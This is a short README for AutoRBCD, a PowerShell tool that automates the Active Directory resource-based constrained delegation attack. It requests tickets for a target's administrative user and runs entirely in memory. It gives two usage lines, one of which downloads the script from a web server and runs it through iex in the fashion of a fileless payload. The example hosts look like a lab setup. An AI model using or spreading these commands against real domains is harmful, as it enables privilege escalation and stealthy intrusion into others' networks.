# AutoRBCD
Automagically executes the resource based constrained delegation attack in the current context.
And requests tickets for the administrative user of the Target.
No files are written to disk, everything is executed from memory.

```PS . ./AutoRBCD.ps1 | Invoke-AutoRBCD -WebServer 192.168.49.68 -Target appsrv01 -Domain prod.corp3.com```

```PS (New-Object System.Net.WebClient).DownloadString("http:<serverip>/AutoRBCD.ps1") | iex; Invoke-AutoRBCD -WebServer 192.168.49.68 -Target appsrv01 -Domain prod.corp3.com```
